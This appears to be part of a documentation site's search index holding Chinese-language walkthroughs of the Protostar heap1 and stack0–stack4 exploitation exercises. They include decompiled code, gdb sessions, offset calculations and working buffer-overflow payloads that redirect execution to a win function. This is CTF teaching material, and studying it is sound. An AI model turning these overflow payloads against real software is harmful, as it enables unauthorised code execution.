_start+33\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg&gt; x/wx $esp\n0xffffce70:     0x0804a1b0\npwndbg&gt; p/x $eax\n$1 = 0x804a1b0\n</code></pre></p> <p>\u4ee3\u7801\u521a\u6267\u884c\u5b8c<code>mov    DWORD PTR [esp],eax</code>,\u6267\u884c\u505c\u5728\u7b2c\u4e00\u6b21strcmp\u4e4b\u524d\uff0c \u6b64\u65f6esp\u7684\u5730\u5740\uff08\u6216\u8005eax\u7684\u5730\u5740\uff09\u5c31\u662fchunka\u7684\u8d77\u59cb\u5730\u5740\uff1a0x804a1b0</p> <p>\u7ee7\u7eed\uff0c\u6211\u4eec\u9700\u8981\u83b7\u53d6\u5230p2\u7684\u8d77\u59cb\u5730\u5740\uff1a <pre><code>pwndbg&gt; x/wx $esp+0x18\n0xffffce88:     0x0804a1c0\n</code></pre></p> <p>\u8ba1\u7b97\u504f\u79fb <pre><code>p2[1] \u5730\u5740 = p2 \u8d77\u59cb\u5730\u5740 + 4 = 0x0804a1c0 + 4 = 0x0804a1c4\n\n\u800cchunka\u7684\u8d77\u59cb\u5730\u5740\u4e3a\uff1a0x804a1b0\n\n\u6240\u4ee5\u9700\u8981\u7684\u504f\u79fb\u4e3a\uff1a0x0804a1c4 - 0x804a1b0 = 0x14 = 20\n</code></pre></p> <p>\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a <pre><code>\u2514\u2500$ ./heap1 $(python2 -c \"print 'A'*20 + '\\x74\\x97\\x04\\x08'\") $(python2 -c \"print '\\x94\\x84\\x04\\x08'\")\nand we have a winner @ 1757928812\n\n\u250c\u2500\u2500(kali\u327fkali)-[/opt/protostar/bin]\n\u2514\u2500$ ./heap1 `python2 -c \"print 'A'*20 + '\\x74\\x97\\x04\\x08'\"`  `python2 -c \"print '\\x94\\x84\\x04\\x08'\"`\nand we have a winner @ 1757928839\n</code></pre> </p>"},{"location":"pwn/Protostar_stack0/","title":"Protostar_stack0","text":"<p>\u8fd0\u884c\u7a0b\u5e8f\uff0c\u5982\u4e0b</p> <p></p> <p>\u67e5\u770b\u53cd\u7f16\u8bd1\u4ee3\u7801</p> <pre><code>void main(void)\n{\n    undefined auStack84 [64];\n    int32_t iStack20;\n\n    iStack20 = 0;\n    gets(auStack84);\n    if (iStack20 == 0) {\n        puts(\"Try again?\");\n    } else {\n        puts(\"you have changed the \\'modified\\' variable\");\n    }\n    return;\n}\n</code></pre> <p>\u672c\u9898\u76ee\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u83b7\u53d6\u8f93\u5165\uff0c\u8f93\u5165\u6570\u7ec4\u957f\u5ea6\u4e3a64,\u53ea\u9700\u8981\u8f93\u51fa\u957f\u5ea6\u8d85\u8fc764\u6ea2\u51fa\u4fee\u6539iStack20\u5c31OK\uff0c\u5982\u4e0b</p> <p></p>"},{"location":"pwn/Protostar_stack1/","title":"Protostar_stack1","text":"<p>\u8fd0\u884c\u7a0b\u5e8f\uff0c\u5982\u4e0b</p> <p></p> <p>checksec</p> <p></p> <p>\u67e5\u770b\u53cd\u7f16\u8bd1\u4ee3\u7801</p> <pre><code>void main(char **argv, char **envp)\n{\n    undefined auStack84 [64];\n    int32_t iStack20;\n\n    if (argv == (char **)0x1) {\n        errx(1, \"please specify an argument\\n\");\n    }\n    iStack20 = 0;\n    strcpy(auStack84, envp[1]);\n    if (iStack20 == 0x61626364) {\n        puts(\"you have correctly got the variable to the right value\");\n    } else {\n        printf(\"Try again, you got 0x%08x\\n\", iStack20);\n    }\n    return;\n}\n</code></pre> <p>\u672c\u9898\u76ee\u76f8\u8f83\u4e8estack0,\u589e\u52a0\u4e00\u4e2a\u68c0\u6d4b<code>(iStack20 == 0x61626364)</code></p> <p>exp\u5982\u4e0b\uff1a</p> <p>(0x61626364\u5373abcd,\u8981\u4ee5\u5c0f\u7aef\u5e8f\u683c\u5f0f\u8f93\u5165\uff0cadba --&gt; \\x64\\x63\\x62\\x61)</p> <p><code>./stack1 `python -c \"print('A'*64+'\\x64\\x63\\x62\\x61')\"`</code></p> <p></p> <p> </p> <p> </p> <p> </p> <p> </p>"},{"location":"pwn/Protostar_stack2/","title":"Protostar_stack2","text":"<p>\u8fd0\u884c\u8be5\u7a0b\u5e8f\uff0c\u5f97\u5230\uff1a</p> <p></p> <p>\u6309\u7167\u8f93\u51fa\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u540e\uff0c\u518d\u6b21\u6267\u884c\uff1a</p> <p></p> <p>checksec:</p> <p></p> <p>\u67e5\u770b\u5176\u53cd\u7f16\u8bd1\u4ee3\u7801\uff1a</p> <pre><code>void main(void)\n{\n    undefined auStack88 [64];\n    int32_t iStack24;\n    int32_t iStack20;\n\n    iStack20 = getenv(\"GREENIE\");\n    if (iStack20 == 0) {\n        errx(1, \"please set the GREENIE environment variable\\n\");\n    }\n    iStack24 = 0;\n    strcpy(auStack88, iStack20);\n    if (iStack24 == 0xd0a0d0a) {\n        puts(\"you have correctly modified the variable\");\n    } else {\n        printf(\"Try again, you got 0x%08x\\n\", iStack24);\n    }\n    return;\n}\n</code></pre> <p>\u672c\u9898\u4e2d\u9996\u5148\u83b7\u53d6<code>GREENIE</code>\u73af\u5883\u53d8\u91cf\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5219\u63d0\u793a\u9700\u8981\u8bbe\u7f6e\uff1b</p> <p>\u7136\u540e\u5224\u65ad<code>iStack24</code>\u662f\u5426\u7b49\u4e8e<code>0xd0a0d0a</code></p> <p>exp\u5982\u4e0b\uff1a</p> <pre><code>In [1]: import os\n\nIn [2]: env_val = 'a'*64 + '\\x0a\\x0d\\x0a\\x0d'\n\nIn [3]: os.putenv('GREENIE',env_val)\n\nIn [4]: os.system('./stack2')\nyou have correctly modified the variable\nOut[4]: 10496\n</code></pre>"},{"location":"pwn/Protostar_stack3/","title":"Protostar_stack3","text":"<p>\u8fd0\u884c\u8be5\u7a0b\u5e8f\uff0c\u5f97\u5230\uff1a</p> <p></p> <p>checksec:</p> <p></p> <p>objdump:</p> <pre><code>\u2514\u2500$ objdump -t -j .text stack3\n\nstack3:     file format elf32-i386\n\nSYMBOL TABLE:\n08048370 l    d  .text  00000000              .text\n080483a0 l     F .text  00000000              __do_global_dtors_aux\n08048400 l     F .text  00000000              frame_dummy\n080484f0 l     F .text  00000000              __do_global_ctors_aux\n08048480 g     F .text  00000005              __libc_csu_fini\n08048370 g     F .text  00000000              _start\n08048424 g     F .text  00000014              win\n08048490 g     F .text  0000005a              __libc_csu_init\n080484ea g     F .text  00000000              .hidden __i686.get_pc_thunk.bx\n08048438 g     F .text  00000041              main\n</code></pre> <p>\u67e5\u770b\u6c47\u7f16\u4ee3\u7801:</p> <pre><code>gdb-peda$ disass main\nDump of assembler code for function main:\n   0x08048438 &lt;+0&gt;:     push   ebp\n   0x08048439 &lt;+1&gt;:     mov    ebp,esp\n   0x0804843b &lt;+3&gt;:     and    esp,0xfffffff0\n   0x0804843e &lt;+6&gt;:     sub    esp,0x60\n   0x08048441 &lt;+9&gt;:     mov    DWORD PTR [esp+0x5c],0x0\n   0x08048449 &lt;+17&gt;:    lea    eax,[esp+0x1c]\n   0x0804844d &lt;+21&gt;:    mov    DWORD PTR [esp],eax\n   0x08048450 &lt;+24&gt;:    call   0x8048330 &lt;gets@plt&gt;\n   0x08048455 &lt;+29&gt;:    cmp    DWORD PTR [esp+0x5c],0x0\n   0x0804845a &lt;+34&gt;:    je     0x8048477 &lt;main+63&gt;\n   0x0804845c &lt;+36&gt;:    mov    eax,0x8048560\n   0x08048461 &lt;+41&gt;:    mov    edx,DWORD PTR [esp+0x5c]\n   0x08048465 &lt;+45&gt;:    mov    DWORD PTR [esp+0x4],edx\n   0x08048469 &lt;+49&gt;:    mov    DWORD PTR [esp],eax\n   0x0804846c &lt;+52&gt;:    call   0x8048350 &lt;printf@plt&gt;\n   0x08048471 &lt;+57&gt;:    mov    eax,DWORD PTR [esp+0x5c]\n   0x08048475 &lt;+61&gt;:    call   eax\n   0x08048477 &lt;+63&gt;:    leave\n   0x08048478 &lt;+64&gt;:    ret\nEnd of assembler dump.\ngdb-peda$ disass win\nDump of assembler code for function win:\n   0x08048424 &lt;+0&gt;:     push   ebp\n   0x08048425 &lt;+1&gt;:     mov    ebp,esp\n   0x08048427 &lt;+3&gt;:     sub    esp,0x18\n   0x0804842a &lt;+6&gt;:     mov    DWORD PTR [esp],0x8048540\n   0x08048431 &lt;+13&gt;:    call   0x8048360 &lt;puts@plt&gt;\n   0x08048436 &lt;+18&gt;:    leave\n   0x08048437 &lt;+19&gt;:    ret\nEnd of assembler dump.\n</code></pre> <p>\u67e5\u770b\u53cd\u7f16\u8bd1\u4ee3\u7801:</p> <pre><code>void main(void)\n{\n    undefined auStack84 [64];\n    code *pcStack20;\n\n    pcStack20 = (code *)0x0;\n    gets(auStack84);\n    if (pcStack20 != (code *)0x0) {\n        printf(\"calling function pointer, jumping to 0x%08x\\n\", pcStack20);\n        (*pcStack20)();\n    }\n    return;\n}\n</code></pre> <pre><code>void win(void)\n{\n    puts(\"code flow successfully changed\");\n    return;\n}\n</code></pre> <p>\u672c\u9898\u76ee\u662f\u83b7\u53d6\u8f93\u5165\u5e76\u4f20\u9012\u7ed9 <code>auStack84 [64]</code>\u6570\u7ec4\uff0c\u7531\u4e8e\u4f7f\u7528\u4e86\u4e0d\u5b89\u5168\u7684<code>gets</code>\u51fd\u6570(\u5176\u5e76\u6ca1\u6709\u68c0\u6d4b\u8f93\u5165\u7684\u957f\u5ea6)\uff0c\u6240\u4ee5\u4ee5\u8f93\u5165\u8fc7\u957f\u7684\u6570\u636e\u7528\u4ee5\u8fbe\u5230\u6ea2\u51fa\u7684\u76ee\u7684\uff0c\u4ece\u800c\u4fee\u6539<code>pcStack20</code>\u7684\u503c</p> <p>\u5728\u901a\u8fc7\u6ea2\u51fa\u4fee\u6539<code>pcStack20</code>\u7684\u503c\u540e\uff0c\u5c31\u53ef\u4ee5\u8fdb\u5165 <code>if (pcStack20 != (code *)0x0)</code> \uff0c\u4ece\u800c\u6267\u884c\u88ab\u4fee\u6539\u540e\u7684<code>pcStack20</code>\u6307\u5411\u7684\u5730\u5740</p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u83b7\u53d6\u9700\u8981\u8fdb\u884c\u6ea2\u51fa\u7684\u7f13\u51b2\u533a\u7684\u5927\u5c0f\uff1a</p> <pre><code>gdb-peda$ pattern_create 200\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'\ngdb-peda$ file stack3\nReading symbols from stack3...\ngdb-peda$ run\nStarting program: /opt/protostar/bin/stack3 \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\ncalling function pointer, jumping to 0x41644141\n\u3002\u3002\u3002\u3002\u3002\u3002\n\n\n[----------------------------------registers-----------------------------------]\nEAX: 0x41644141 ('AAdA')\nEBX: 0xf7e1dff4 --&gt; 0x21dd8c \nECX: 0xffffce7c --&gt; 0x7363be00 \nEDX: 0x1 \nESI: 0x8048490 (&lt;__libc_csu_init&gt;:      push   ebp)\nEDI: 0xf7ffcba0 --&gt; 0x0 \nEBP: 0xffffcf28 (\"AA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\nESP: 0xffffcebc --&gt; 0x8048477 (&lt;main+63&gt;:       leave)\nEIP: 0x41644141 ('AAdA')\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41644141\n[------------------------------------stack-------------------------------------]\n0000| 0xffffcebc --&gt; 0x8048477 (&lt;main+63&gt;:      leave)\n0004| 0xffffcec0 --&gt; 0x8048560 (\"calling function pointer, jumping to 0x%08x\\n\")\n0008| 0xffffcec4 (\"AAdA\\350\\325\\377\\367\\034\")\n0012| 0xffffcec8 --&gt; 0xf7ffd5e8 --&gt; 0xf7fca000 --&gt; 0x464c457f \n0016| 0xffffcecc --&gt; 0x1c \n0020| 0xffffced0 --&gt; 0xf7ffcff4 --&gt; 0x32f34 \n0024| 0xffffced4 --&gt; 0xc ('\\x0c')\n0028| 0xffffced8 --&gt; 0x0 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x41644141 in ?? ()\n</code></pre> <p>\u00a0\u53ef\u4ee5\u770b\u5230<code>Invalid $PC address: 0x41644141</code></p> <p>\u6c42\u5176\u504f\u79fb\u957f\u5ea6\uff1a</p> <pre><code>gdb-peda$ pattern_offset 0x41644141\n1097089345 found at offset: 64\n</code></pre> <p>\u5373\u9700\u8981\u6ea2\u51fa\u7684\u957f\u5ea6\u4e3a64,\u6211\u4eec\u8fd8\u9700\u8981win\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u4e2a\u5df2\u7ecf\u5728\u4e0a\u9762\u627e\u5230\uff0c\u5373<code>0x08048424</code>\uff1a</p> <pre><code>gdb-peda$ disass win\nDump of assembler code for function win:\n   0x08048424 &lt;+0&gt;:     push   ebp\n</code></pre> <p>PS:0x08048424\u9700\u8981\u5199\u6210\u5c0f\u7aef\u5e8f</p> <p>exp\u5982\u4e0b\uff1a</p> <pre><code>In [1]: from pwn import *\n\nIn [2]: payload = 'A'*64 + '\\x24\\x84\\x04\\x08'\n\nIn [3]: sh = process(\"./stack3\")\n[x] Starting local process './stack3'\n[+] Starting local process './stack3': pid 204414\n\nIn [4]: sh.sendline(payload)\n&lt;ipython-input-4-96fbe51e0736&gt;:1: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes\n  sh.sendline(payload)\n\nIn [5]: sh.recvall()\n[x] Receiving all data\n[x] Receiving all data: 0B\n[*] Process './stack3' stopped with exit code 31 (pid 204414)\n[x] Receiving all data: 79B\n[+] Receiving all data: Done (79B)\nOut[5]: b'calling function pointer, jumping to 0x08048424\\ncode flow successfully changed\\n'\n</code></pre> <p> </p>"},{"location":"pwn/Protostar_stack4/","title":"Protostar_stack4","text":"<p>\u8fd0\u884c\u8be5\u7a0b\u5e8f\uff0c\u5f97\u5230\uff1a</p> <p></p>"},{"location":"pwn/Protostar_stack4/#source-code","title":"Source code:","text":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid win()\n{\n  printf(\"code flow successfully changed\\n\");\n}\n\nint main(int argc, char **argv)\n{\n  char buffer[64];\n\n  gets(buffer);\n}\n</code></pre> <p>checksec:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/opt/protostar/bin]\n\u2514\u2500$ checksec --file=./stack4 \n[*] '/opt/protostar/bin/stack4'\n    Arch:     i386-32-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n</code></pre> <p>objdump:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/opt/protostar/bin]\n\u2514\u2500$ objdump -t -j .text ./stack4 \n\n./stack4:     file format elf32-i386\n\nSYMBOL TABLE:\n08048340 l    d  .text  00000000              .text\n08048370 l     F .text  00000000              __do_global_dtors_aux\n080483d0 l     F .text  00000000              frame_dummy\n08048490 l     F .text  00000000              __do_global_ctors_aux\n08048420 g     F .text  00000005              __libc_csu_fini\n08048340 g     F .text  00000000              _start\n080483f4 g     F .text  00000014              win\n08048430 g     F .text  0000005a              __libc_csu_init\n0804848a g     F .text  00000000              .hidden __i686.get_pc_thunk.bx\n08048408 g     F .text  00000017              main\n</code></pre> <p>\u67e5\u770b\u6c47\u7f16\u4ee3\u7801:</p> <pre><code>gdb-peda$ disass main\nDump of assembler code for function main:\n   0x08048408 &lt;+0&gt;:     push   ebp\n   0x08048409 &lt;+1&gt;:     mov    ebp,esp\n   0x0804840b &lt;+3&gt;:     and    esp,0xfffffff0\n   0x0804840e &lt;+6&gt;:     sub    esp,0x50\n   0x08048411 &lt;+9&gt;:     lea    eax,[esp+0x10]\n   0x08048415 &lt;+13&gt;:    mov    DWORD PTR [esp],eax\n   0x08048418 &lt;+16&gt;:    call   0x804830c &lt;gets@plt&gt;\n   0x0804841d &lt;+21&gt;:    leave\n   0x0804841e &lt;+22&gt;:    ret\nEnd of assembler dump.\ngdb-peda$ disass win\nDump of assembler code for function win:\n   0x080483f4 &lt;+0&gt;:     push   ebp\n   0x080483f5 &lt;+1&gt;:     mov    ebp,esp\n   0x080483f7 &lt;+3&gt;:     sub    esp,0x18\n   0x080483fa &lt;+6&gt;:     mov    DWORD PTR [esp],0x80484e0\n   0x08048401 &lt;+13&gt;:    call   0x804832c &lt;puts@plt&gt;\n   0x08048406 &lt;+18&gt;:    leave\n   0x08048407 &lt;+19&gt;:    ret\nEnd of assembler dump.\n</code></pre> <p>\u8c03\u8bd5\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <pre><code>(gdb) i b\nNum     Type           Disp Enb Address    What\n1       breakpoint     keep y   0x08048408 in main at stack4/stack4.c:12\n2       breakpoint     keep y   0x08048409 in main at stack4/stack4.c:12\n3       breakpoint     keep y   0x0804840b in main at stack4/stack4.c:12\n4       breakpoint     keep y   0x0804840e in main at stack4/stack4.c:12\n5       breakpoint     keep y   0x08048411 in main at stack4/stack4.c:15\n6       breakpoint     keep y   0x08048415 in main at stack4/stack4.c:15\n7       breakpoint     keep y   0x08048418 in main at stack4/stack4.c:15\n8       breakpoint     keep y   0x0804841d in main at stack4/stack4.c:16\n9       breakpoint     keep y   0x0804841e in main at stack4/stack4.c:16\n</code></pre> <p><code>0x8048408 &lt;main&gt;: push ebp\uff1a</code></p> <p>1\u3001<code>push ebp:</code>\u5c06\u5f53\u524d\u51fd\u6570\u7684\u57fa\u5740\u6307\u9488\uff08ebp\uff09\u7684\u503c\u538b\u5165\u6808\u4e2d\uff0c\u4fdd\u5b58\u5f53\u524d\u51fd\u6570\u7684\u6808\u5e27</p> <pre><code>(gdb) r\nStarting program: /opt/protostar/bin/stack4 \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n\nBreakpoint 1, main (argc=&lt;error reading variable: Unknown argument list address for `argc'.&gt;, \n    argv=&lt;error reading variable: Unknown argument list address for `argv'.&gt;) at stack4/stack4.c:12\n12      stack4/stack4.c: No such file or directory.\n(gdb) i r\neax            0x8048408           134513672\necx            0x89ae3a96          -1985070442\nedx            0xffffcfd0          -12336\nebx            0xf7e1dff4          -136192012\nesp            0xffffcfac          0xffffcfac\nebp            0x0                 0x0\nesi            0x8048430           134513712\nedi            0xf7ffcba0          -134231136\neip            0x8048408           0x8048408 &lt;main&gt;\neflags         0x246               [ PF ZF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/10i $eip\n=&gt; 0x8048408 &lt;main&gt;:    push   ebp\n   0x8048409 &lt;main+1&gt;:  mov    ebp,esp\n   0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0\n   0x804840e &lt;main+6&gt;:  sub    esp,0x50\n   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]\n   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax\n   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;\n   0x804841d &lt;main+21&gt;: leave\n   0x804841e &lt;main+22&gt;: ret\n   0x804841f:   nop\n(gdb) x/20wx $esp\n0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c\n0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001\n0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0\n0xffffcfdc:     0x00000000      0xf25e5086      0x89ae3a96      0x00000000\n0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000\n</code></pre> <p>\u6267\u884c<code>push ebp</code>\u540e\uff0c<code>esp 0xffffcfac -&gt; 0xffffcfa8</code></p> <p>2\u3001<code>mov ebp,esp\uff1a</code>\u5c06\u5f53\u524d\u6808\u6307\u9488\u7684\u503c\u8d4b\u7ed9\u57fa\u5740\u6307\u9488\uff0c\u5efa\u7acb\u5f53\u524d\u51fd\u6570\u7684\u6808\u5e27\u3002</p> <pre><code>(gdb) n\n\nBreakpoint 2, 0x08048409 in main (argc=&lt;error reading variable: Unknown argument list address for `argc'.&gt;, \n    argv=&lt;error reading variable: Unknown argument list address for `argv'.&gt;) at stack4/stack4.c:12\n12      in stack4/stack4.c\n(gdb) i r\neax            0x8048408           134513672\necx            0x89ae3a96          -1985070442\nedx            0xffffcfd0          -12336\nebx            0xf7e1dff4          -136192012\nesp            0xffffcfa8          0xffffcfa8\nebp            0x0                 0x0\nesi            0x8048430           134513712\nedi            0xf7ffcba0          -134231136\neip            0x8048409           0x8048409 &lt;main+1&gt;\neflags         0x246               [ PF ZF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/10i $eip\n=&gt; 0x8048409 &lt;main+1&gt;:  mov    ebp,esp\n   0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0\n   0x804840e &lt;main+6&gt;:  sub    esp,0x50\n   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]\n   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax\n   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;\n   0x804841d &lt;main+21&gt;: leave\n   0x804841e &lt;main+22&gt;: ret\n   0x804841f:   nop\n   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp\n(gdb) x/20wx $esp\n0xffffcfa8:     0x00000000      0xf7c237c5      0x00000001      0xffffd064\n0xffffcfb8:     0xffffd06c      0xffffcfd0      0xf7e1dff4      0x08048408\n0xffffcfc8:     0x00000001      0xffffd064      0xf7e1dff4      0x08048430\n0xffffcfd8:     0xf7ffcba0      0x00000000      0xf25e5086      0x89ae3a96\n0xffffcfe8:     0x00000000      0x00000000      0x00000000      0xf7ffcba0\n</code></pre> <p>\u00a0\u6267\u884c<code>mov ebp,esp</code>\u540e\uff0c<code>ebp = esp = 0xffffcfa8</code></p> <p>3\u3001<code>and esp,0xfffffff0\uff1a</code>\u5c06\u6808\u6307\u9488\u4e0e0xfffffff0\u8fdb\u884c\u6309\u4f4d\u4e0e\u64cd\u4f5c\uff0c\u5c06\u6808\u6307\u9488\u5411\u4e0b\u820d\u5165\u523016\u5b57\u8282\u8fb9\u754c\uff0c\u4ee5\u5bf9\u9f50\u6808\u3002</p> <pre><code>(gdb) n\n\nBreakpoint 3, 0x0804840b in main (argc=1, argv=0xffffd064) at stack4/stack4.c:12\n12      in stack4/stack4.c\n(gdb) i r\neax            0x8048408           134513672\necx            0x89ae3a96          -1985070442\nedx            0xffffcfd0          -12336\nebx            0xf7e1dff4          -136192012\nesp            0xffffcfa8          0xffffcfa8\nebp            0xffffcfa8          0xffffcfa8\nesi            0x8048430           134513712\nedi            0xf7ffcba0          -134231136\neip            0x804840b           0x804840b &lt;main+3&gt;\neflags         0x246               [ PF ZF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/10i $eip\n=&gt; 0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0\n   0x804840e &lt;main+6&gt;:  sub    esp,0x50\n   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]\n   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax\n   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;\n   0x804841d &lt;main+21&gt;: leave\n   0x804841e &lt;main+22&gt;: ret\n   0x804841f:   nop\n   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp\n   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp\n(gdb) x/20wx $esp\n0xffffcfa8:     0x00000000      0xf7c237c5      0x00000001      0xffffd064\n0xffffcfb8:     0xffffd06c      0xffffcfd0      0xf7e1dff4      0x08048408\n0xffffcfc8:     0x00000001      0xffffd064      0xf7e1dff4      0x08048430\n0xffffcfd8:     0xf7ffcba0      0x00000000      0xf25e5086      0x89ae3a96\n0xffffcfe8:     0x00000000      0x00000000      0x00000000      0xf7ffcba0\n</code></pre> <p>\u00a0\u6267\u884c<code>and esp,0xfffffff0</code>\u540e\uff0c<code>esp 0xffffcfa8 - &gt; 0xffffcfa0</code>\uff0c\u53ef\u4ee5\u770b\u5230<code>0xffffcfa0: 0x00000000 0x00000078 0x00000000 0xf7c237c5</code>\u8fd9\u4e00\u884c\uff0cesp\u88ab\u5bf9\u9f50</p> <p>4\u3001<code>sub esp,0x50\uff1a</code>\u5206\u914d80\u5b57\u8282\u7684\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\uff0c\u901a\u8fc7\u5c06\u6808\u6307\u9488\u5411\u4e0b\u79fb\u52a8\u6765\u5b9e\u73b0\u3002</p> <pre><code>(gdb) n\n\nBreakpoint 4, 0x0804840e in main (argc=1, argv=0xffffd064) at stack4/stack4.c:12\n12      in stack4/stack4.c\n(gdb) i r\neax            0x8048408           134513672\necx            0x89ae3a96          -1985070442\nedx            0xffffcfd0          -12336\nebx            0xf7e1dff4          -136192012\nesp            0xffffcfa0          0xffffcfa0\nebp            0xffffcfa8          0xffffcfa8\nesi            0x8048430           134513712\nedi            0xf7ffcba0          -134231136\neip            0x804840e           0x804840e &lt;main+6&gt;\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/10i $eip\n=&gt; 0x804840e &lt;main+6&gt;:  sub    esp,0x50\n   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]\n   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax\n   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;\n   0x804841d &lt;main+21&gt;: leave\n   0x804841e &lt;main+22&gt;: ret\n   0x804841f:   nop\n   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp\n   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp\n   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp\n(gdb) x/20wx $esp\n0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5\n0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0\n0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064\n0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000\n0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000\n</code></pre> <p>\u00a0\u6267\u884c<code>sub esp,0x50</code>\u540e\uff0c<code>esp 0xffffcfa0 - &gt; 0xffffcf50</code></p> <p>5\u3001<code>lea eax,[esp+0x10]\uff1a</code>\u8ba1\u7b97\u5e76\u5c06<code>esp+0x10</code>\u7684\u5730\u5740\u5b58\u50a8\u5728eax\u5bc4\u5b58\u5668\u4e2d\u3002\u6b64\u5904\u53ef\u80fd\u5728\u51c6\u5907\u8c03\u7528<code>gets</code>\u51fd\u6570\u4e4b\u524d\uff0c\u4e3a\u8f93\u5165\u7f13\u51b2\u533a\u5206\u914d\u7a7a\u95f4\u3002</p> <pre><code>(gdb) n\n</code></pre> <p>Copy Copied</p> 